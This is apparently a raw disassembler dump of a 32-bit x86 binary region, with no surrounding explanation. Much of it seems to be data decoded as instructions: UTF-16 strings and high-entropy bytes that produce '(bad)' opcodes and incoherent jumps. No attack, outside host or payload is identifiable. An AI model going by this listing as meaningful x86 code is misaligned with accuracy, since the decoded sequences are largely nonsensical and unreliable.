  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf7
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    DWORD PTR [ebx+0x0],eax
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	add    dl,BYTE PTR [ebx-0x54]
  413f03:	dec    edi
  413f04:	(bad)  
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    eax,0x92000001
  413f0d:	inc    eax
  413f0e:	mov    ch,0xbe
  413f10:	mov    al,ds:0xdceafd43
  413f15:	xor    ebp,esp
  413f17:	sub    ch,ch
  413f19:	in     eax,dx
  413f1a:	ret    0xc344
  413f1d:	or     bl,BYTE PTR [ebp-0x45]
  413f20:	adc    BYTE PTR [ebx-0x4bff7f27],0xc
  413f27:	(bad)  
  413f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f29:	cs mov edx,0xbf330e40
  413f2f:	push   0x51
  413f31:	jecxz  0x413f1d
  413f33:	stos   DWORD PTR es:[edi],eax
  413f34:	mov    ebp,0x8073236b
  413f39:	push   edi
  413f3a:	jmp    0x3f3f:0xeab19c37
  413f41:	shl    bl,cl
  413f43:	in     eax,0x1d
  413f45:	xchg   edi,eax
  413f46:	fst    QWORD PTR [edi+0x2d665232]
  413f4c:	(bad)  
  413f4d:	shr    BYTE PTR [eax+0x36],0xf6
  413f51:	inc    edi
  413f52:	ret    0x5c52
  413f55:	jecxz  0x413fa6
  413f57:	iret   
  413f58:	and    al,0x54
  413f5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f5b:	repnz fcomp QWORD PTR [edx+ebx*4]
  413f5f:	lds    edx,FWORD PTR [esi-0x58]
  413f62:	sbb    DWORD PTR [esi],edi
  413f64:	test   al,0xda
  413f66:	pushf  
  413f67:	fs call 0x837ad2a8
  413f6d:	ret    0xe6
  413f70:	jb     0x413f89
  413f72:	adc    bl,BYTE PTR [edi-0x18]
  413f75:	mov    al,ds:0x4a687489
  413f7a:	push   eax
  413f7b:	push   edi
  413f7c:	mov    ecx,0x827be915
  413f81:	jo     0x413fad
  413f83:	test   al,0xdc
  413f85:	repnz hlt 
  413f87:	(bad)  
  413f88:	adc    ch,BYTE PTR [ebp-0x3b]
  413f8b:	and    al,0x2e
  413f8d:	xor    al,0x5a
  413f8f:	mov    dl,0x3c
  413f91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f92:	sahf   
  413f93:	ins    BYTE PTR es:[edi],dx
  413f94:	mov    al,ds:0x60ffb161
  413f99:	mov    al,0xb4
  413f9b:	mov    ds:0xc8ee908a,eax
  413fa0:	cmp    dh,ch
  413fa2:	xor    DWORD PTR [ecx-0x4b6d401b],ebp
  413fa8:	aas    
  413fa9:	jmp    0x413fa8
  413fab:	xchg   edi,eax
  413fac:	(bad)  
  413fad:	mov    eax,ds:0x95a5a350
  413fb2:	lods   al,BYTE PTR ds:[esi]
  413fb3:	push   0x41ae678b
  413fb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fb9:	rcl    ebp,cl
  413fbb:	out    0x9d,eax
  413fbd:	loopne 0x414005
  413fbf:	adc    dl,ch
  413fc1:	mov    BYTE PTR [esp+ebx*8+0x71d90df2],ah
  413fc8:	cmp    DWORD PTR [eax-0x50],0x4a
  413fcc:	and    BYTE PTR [ecx],0x66
  413fcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fd0:	sub    DWORD PTR fs:[ebp-0x3d6325d],eax
  413fd7:	and    WORD PTR [eax+eiz*8+0x17fbe0a0],ax
  413fdf:	add    al,0xf7
  413fe1:	and    esi,DWORD PTR ds:0xb5b7091
  413fe7:	(bad)  
  413fe8:	and    eax,ebp
  413fea:	push   es
  413feb:	mov    DWORD PTR ds:0x4e0fe96d,esi
  413ff1:	adc    BYTE PTR [edx-0x51],dh
  413ff4:	jmp    0x866e:0xd4cb60fb
  413ffb:	mov    esi,0xd06e7ec1
  414000:	repz inc esi
  414002:	mov    edx,DWORD PTR [eax+eax*8+0x136e516a]
  414009:	stos   DWORD PTR es:[edi],eax
  41400a:	fcom   DWORD PTR [ecx-0x7b]
  41400d:	jmp    0x413fb0
  41400f:	sar    DWORD PTR [ecx],1
	...
  414071:	add    BYTE PTR [eax],al
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0xcbef:0x65d52e96
  414083:	and    ecx,esp
  414085:	rol    BYTE PTR [eax],cl
  414087:	add    BYTE PTR ds:0x9a000001,al
  41408d:	loopne 0x41410c
  41408f:	pop    edx
  414090:	ficomp WORD PTR [ecx+ebx*8]
  414093:	pop    ss
  414094:	cli    
  414095:	xchg   edx,eax
  414096:	mov    eax,0x2f3a0332
  41409b:	arpl   WORD PTR [esi],bp
  41409d:	or     DWORD PTR [ebx+0x76e21a0a],esi
  4140a3:	jnp    0x41405a
  4140a5:	push   edx
  4140a6:	or     DWORD PTR [ecx+0x33],edx
  4140a9:	adc    ebp,DWORD PTR [edx]
  4140ab:	pop    ecx
  4140ac:	push   es
  4140ad:	push   esi
  4140ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140af:	jbe    0x41408d
  4140b1:	mov    ebp,0x41ea892
  4140b6:	fld    DWORD PTR ss:[esi]
  4140b9:	fwait
  4140ba:	mov    dl,0x0
  4140bc:	fs scas al,BYTE PTR es:[edi]
  4140be:	mov    DWORD PTR [ebx+0x5c51f791],ecx
  4140c4:	xor    ecx,ebp
  4140c6:	rcl    BYTE PTR [ecx],0xda
  4140c9:	xchg   BYTE PTR [edi],cl
  4140cb:	lock jge 0x414149
  4140ce:	pop    ds
  4140cf:	les    ebx,FWORD PTR [esi+ecx*8]
  4140d2:	(bad)  
  4140d4:	shl    DWORD PTR [edx-0x6e],1
  4140d7:	aaa    
  4140d8:	lock loopne 0x41408f
  4140db:	mov    eax,0x6ac4c0a7
  4140e0:	dec    ebx
  4140e1:	or     BYTE PTR [edx+0x6b],0x3e
  4140e5:	leave  
  4140e6:	jbe    0x4140f0
  4140e8:	scas   eax,DWORD PTR es:[edi]
  4140e9:	xchg   edx,eax
  4140ea:	push   ds
  4140eb:	xor    DWORD PTR [ebx+eiz*2-0x3a],ebp
  4140ef:	sbb    esi,DWORD PTR [ecx]
  4140f1:	adc    bl,BYTE PTR [ebx-0x6d]
  4140f4:	jns    0x41409f
  4140f6:	xor    BYTE PTR [edx-0x31],al
  4140f9:	ins    DWORD PTR es:[edi],dx
  4140fa:	repnz xlat BYTE PTR ds:[ebx]
  4140fc:	lds    ebp,FWORD PTR [edx+0x55]
  4140ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414100:	lahf   
  414101:	out    0xdc,eax
  414103:	push   esi
  414104:	out    0x75,al
  414106:	pop    edx
  414107:	dec    ebp
  414108:	aas    
  414109:	shl    esi,0x87
  41410c:	loope  0x4140a2
  41410e:	ins    DWORD PTR es:[edi],dx
  41410f:	js     0x41409c
  414111:	dec    ebx
  414112:	mov    edi,0x237959d0
  414117:	and    al,0x52
  414119:	or     eax,0x4954d2b4
  41411e:	pop    ecx
  41411f:	pop    eax
  414120:	data16 and cl,BYTE PTR gs:[ecx*1+0x50aa2f9c]
  414129:	xchg   edx,eax
  41412a:	repnz sub BYTE PTR [ebx-0xda00d5f],0xad
  414132:	or     al,0x9a
  414134:	in     al,dx
  414135:	pop    esi
  414136:	mov    al,0x13
  414138:	jo     0x4140d8
  41413a:	clc    
  41413b:	or     ebx,edx
  41413d:	enter  0x3b2d,0x82
  414141:	inc    ebx
  414142:	repnz pop ss
  414144:	cmovb  eax,esp
  414147:	push   es
  414148:	mov    eax,0xd248e2fe
  41414d:	and    DWORD PTR [esp+ebp*2],esi
  414150:	push   esi
  414151:	cmp    edx,edx
  414153:	mov    ch,0xfe
  414155:	test   eax,0xe991b108
  41415a:	ja     0x414170
  41415c:	leave  
  41415d:	not    DWORD PTR [edi+0x34]
  414160:	add    al,0x8b
  414162:	or     al,0x14
  414164:	fmulp  st(0),st
  414166:	push   esi
  414167:	pusha  
  414168:	cld    
  414169:	cmc    
  41416a:	fwait
  41416b:	pop    ecx
  41416c:	cdq    
  41416d:	xchg   esp,eax
  41416e:	push   edx
  41416f:	push   ss
  414170:	push   edi
  414171:	pushf  
  414172:	inc    dx
  414174:	mov    ch,0x1e
  414176:	cwde   
  414177:	push   es
  414178:	scas   eax,DWORD PTR es:[edi]
  414179:	jb     0x414121
  41417b:	mov    ecx,0x71c40cc0
  414180:	mov    edx,0xa7ee38a4
  414185:	dec    eax
  414186:	daa    
  414187:	mov    bl,0x9b
  414189:	pop    eax
  41418a:	loopne 0x4141a1
  41418c:	jnp    0x41416d
  41418e:	mov    ch,0x5b
  414190:	mov    dh,0x0
	...
  4141f2:	add    BYTE PTR [eax],al
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	pop    edx
  414201:	out    0xcc,eax
  414203:	stc    
  414204:	out    0xd3,al
  414206:	add    BYTE PTR [eax],al
  414208:	add    eax,0x19000001
  41420d:	xchg   DWORD PTR [eax],edx
  41420f:	or     dh,0x3d
  414212:	bound  edi,QWORD PTR [ebx]
  414214:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414215:	xchg   esi,eax
  414216:	mov    al,0x9b
  414218:	mov    cl,0x98
  41421a:	(bad)  
  41421b:	ins    DWORD PTR es:[edi],dx
  41421c:	adc    DWORD PTR [edx+0x61],esp
  41421f:	ret    
  414220:	dec    eax
  414221:	xlat   BYTE PTR ds:[ebx]
  414222:	cmc    
  414223:	ss jb  0x414257
  414226:	pop    esi
  414227:	pop    ebx
  414228:	shr    DWORD PTR [ebx+eax*2-0x6],cl
  41422c:	cmp    DWORD PTR [ebx-0x79779c58],ecx
  414232:	cmp    BYTE PTR ds:0x7bdebd82,bl
  414238:	scas   eax,DWORD PTR es:[edi]
  414239:	stc    
  41423a:	jns    0x414276
  41423c:	mov    dl,BYTE PTR [edi+0x28]
  41423f:	outs   dx,DWORD PTR ds:[esi]
  414240:	jae    0x4142bb
  414242:	or     ebx,DWORD PTR [ecx]
  414244:	push   ebx
  414245:	pushf  
  414246:	pusha  
  414247:	xor    esi,DWORD PTR [edi-0x3f]
  41424a:	xchg   ecx,eax
  41424b:	test   BYTE PTR [ecx+0xade4a6b],dl
  414251:	adc    eax,0x71073010
  414256:	xor    BYTE PTR [ebx],0xd1
  414259:	adc    BYTE PTR [edx-0x3923b42f],0x58
  414260:	mov    dh,0xfb
  414262:	icebp  
  414263:	aaa    
  414264:	in     al,dx
  414265:	dec    ebx
  414266:	and    DWORD PTR [edx+ebx*2],ebx
  414269:	push   ecx
  41426a:	jbe    0x414280
  41426c:	(bad)  
  41426d:	pop    esp
  41426e:	mov    BYTE PTR [edi+0x1842f98c],ch
  414274:	or     eax,0xf6312043
  414279:	pop    ecx
  41427a:	sti    
  41427b:	repz out dx,al
  41427d:	sub    bh,BYTE PTR [esi]
  41427f:	xchg   edi,eax
  414280:	xchg   DWORD PTR [ebp+0xb],esi
  414283:	mov    dh,0x38
  414285:	pop    edx
  414286:	outs   dx,DWORD PTR ds:[esi]
  414287:	cld    
  414288:	mov    al,ds:0x972dcbbf
  41428d:	ss loopne 0x41421e
  414290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414291:	mov    BYTE PTR [eax-0x40cf9e9a],cl
  414297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414298:	std    
  414299:	stos   BYTE PTR es:[edi],al
  41429a:	dec    esp
  41429b:	cmp    ebp,DWORD PTR [eax-0x7ca51c46]
  4142a1:	adc    al,0xf1
  4142a3:	repz cmp eax,0x38143bb0
  4142a9:	mov    ds:0xfa4fd65e,eax
  4142ae:	fmul   QWORD PTR [esi+0x47e882f9]
  4142b4:	jb     0x414332
  4142b6:	pop    esi
  4142b7:	adc    eax,DWORD PTR [edi+0x28]
  4142ba:	dec    ebp
  4142bb:	jl     0x4142f7
  4142bd:	test   al,0x15
  4142bf:	rcr    BYTE PTR [edi],0x84
  4142c2:	je     0x41427c
  4142c4:	jg     0x4142bf
  4142c6:	ss ins BYTE PTR es:[edi],dx
  4142c8:	sbb    BYTE PTR [edi+0x63],bh
  4142cb:	mov    edx,0x7cddef7e
  4142d0:	mov    bh,0x69
  4142d2:	call   0xe56c:0x92a3d57b
  4142d9:	push   0x3b
  4142db:	and    BYTE PTR [esi+0x51459da3],bl
  4142e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142e2:	dec    ebx
  4142e3:	mov    BYTE PTR [ebp-0x4c],cl
  4142e6:	fdiv   QWORD PTR [edx+ecx*4]
  4142e9:	int    0x1
  4142eb:	es mov cl,0x90
  4142ee:	mov    eax,0x1e38bbc3
  4142f3:	pop    esp
  4142f4:	js     0x41434d
  4142f6:	pop    es
  4142f7:	mov    bh,0x4f
  4142f9:	sbb    al,BYTE PTR [ebx+0x9]
  4142fc:	icebp  
  4142fd:	mov    edi,DWORD PTR ds:0x7eb9
  414302:	mov    dh,0x85
  414304:	xchg   esp,eax
  414305:	inc    esi
  414306:	jmp    0x414332
  414308:	dec    ebx
  414309:	jge    0x4142b5
  41430b:	in     al,dx
  41430c:	and    DWORD PTR [ebx-0x77],edi
  41430f:	cmp    bl,ch
	...
  414371:	add    BYTE PTR [eax],al
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	inc    esp
  414381:	and    eax,0xd4ebec7f
  414386:	add    BYTE PTR [eax],al
  414388:	add    eax,0x42000001
  41438d:	xor    DWORD PTR [ecx-0x15e2a4ad],edx
  414393:	pop    ecx
  414394:	in     al,0x3d
  414396:	ret    
  414397:	add    bl,BYTE PTR [eax+0x26b2f64d]
  41439d:	add    edx,ecx
  41439f:	push   cs
  4143a0:	pop    ebp
  4143a1:	mov    eax,ds:0x169b060
  4143a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143a7:	jmp    0x4143f9
  4143a9:	fs mov eax,gs:0xb934e64
  4143b0:	cmp    al,0xef
  4143b2:	xor    BYTE PTR [ebx+0x22],ch
  4143b5:	mov    ebp,0x480b0d7d
  4143ba:	(bad)  
  4143bb:	mov    ch,0x40
  4143bd:	ror    BYTE PTR [edx-0x4dd52e40],0xce
  4143c4:	pop    ss
  4143c5:	jecxz  0x4143a8
  4143c7:	stos   BYTE PTR es:[edi],al
  4143c8:	jge    0x4143d2
  4143ca:	(bad)  [edx]
  4143cc:	push   0x3442273e
  4143d1:	es inc eax
  4143d3:	push   ebp
  4143d4:	lods   al,BYTE PTR ds:[esi]
  4143d5:	dec    edi
  4143d6:	mov    ch,0xc1
  4143d8:	jmp    0xf8bb:0xdb87c5cf
  4143df:	retf   0xec60
  4143e2:	clc    
  4143e3:	pusha  
  4143e4:	ret    0x5234
  4143e7:	mov    ebx,0x606776c8
  4143ec:	xchg   BYTE PTR ds:0x4388cb87,al
  4143f2:	repz fist DWORD PTR [ebp+eiz*8+0x474bf108]
  4143fa:	and    eax,0x1037a0fa
  4143ff:	and    eax,DWORD PTR [edx+0x13]
  414402:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414403:	push   edx
  414404:	push   eax
  414405:	sar    BYTE PTR [ebp-0x1e],0x17
  414409:	loope  0x41439c
  41440b:	ss cmp eax,0x89074f80
  414411:	out    0xd9,al
  414413:	(bad)  
  414416:	nop
  414417:	das    
  414418:	mov    al,ds:0x6811847b
  41441d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41441e:	mov    al,ds:0x11b63975
  414423:	adc    DWORD PTR [ecx+edi*1+0x69584619],ecx
  41442a:	stos   DWORD PTR es:[edi],eax
  41442b:	and    al,0xaa
  41442d:	xor    al,0x19
  41442f:	(bad)
  414432:	ret    0xf7c0
  414435:	fcmovne st,st(3)
  414437:	test   al,0x6a
  414439:	sub    dl,cl
  41443b:	xor    BYTE PTR [ebp+0x32771db9],bl
  414441:	jne    0x414454
  414443:	adc    dh,BYTE PTR [edi]
  414445:	jp     0x4143ef
  414447:	or     DWORD PTR ds:0x4b688b1e,ebx
  41444d:	call   0x9369:0x11ba479f
  414454:	out    0x38,eax
  414456:	mov    esp,0x6799439b
  41445b:	jl     0x41447e
  41445d:	enter  0xdabe,0xbb
  414461:	xchg   eax,ebp
  414463:	nop
  414464:	mov    dl,0xbd
  414466:	leave  
  414467:	imul   esi,DWORD PTR [ecx],0x7e156bf1
  41446d:	je     0x41441b
  41446f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414470:	xor    eax,0xc054ff6c
  414475:	mov    ebx,0xce6162e2
  41447a:	sub    esp,ebp
  41447c:	mov    al,0xa7
  41447e:	mov    edi,0x6d2949c1
  414483:	cmp    BYTE PTR [edx],0x6f
  414486:	push   ebx
  414487:	mov    dh,0x2a
